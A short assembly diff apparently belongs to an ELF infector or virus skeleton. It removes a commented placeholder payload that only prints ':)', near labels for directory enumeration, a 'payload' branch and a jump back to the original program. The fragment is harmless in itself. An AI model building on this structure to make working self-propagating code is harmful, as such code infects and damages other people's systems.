@@ -450,17 +450,6 @@ lsdirents_done:
     ret
 
 end:
-    ; TODO: this is where the payload goes
-    ; between here
-    ; mov rax, 0x1
-    ; mov rdi, 0x1
-    ; sub rsp, 0x4
-    ; mov word [rsp], ":)"
-    ; mov byte [rsp+2], 0xa
-    ; mov byte [rsp+3], 0x0
-    ; mov rsi, rsp
-    ; mov rdx, 0x3
-    ; syscall
     mov rsp, rbp
     pop rbp
 
@@ -468,7 +457,6 @@ end:
     syscall
     test rax, rax
     jz payload
-    ; and here
     jmp regular_program_address
 
 symbols:
